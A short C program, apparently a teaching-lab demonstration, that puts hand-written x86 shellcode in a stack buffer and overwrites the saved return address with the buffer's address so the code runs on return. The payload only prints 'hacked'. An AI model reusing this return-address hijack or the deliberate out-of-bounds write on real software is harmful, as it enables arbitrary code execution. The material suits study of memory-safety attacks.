#include <stdio.h>

#include <string.h>

void vulnerable() {

  
  char s[28+0x200]="h!\n\x00\x00hckedhattaj\x01[\x89\xe1j\nZRQS\xb8\xa9\x02\x80\x00\xff\xd0j\x00\xb8\xcb\t\x80\x00\xff\xd0";
 // gets(s);
  *(int *)(s+0x28+0x200)=(int)s;
  //cprintf("%p\n",s);
 // puts(s);
  return;

}

int main(void) {

  write(1,"xxxxx",5);
  vulnerable();
  return 0;
}
    
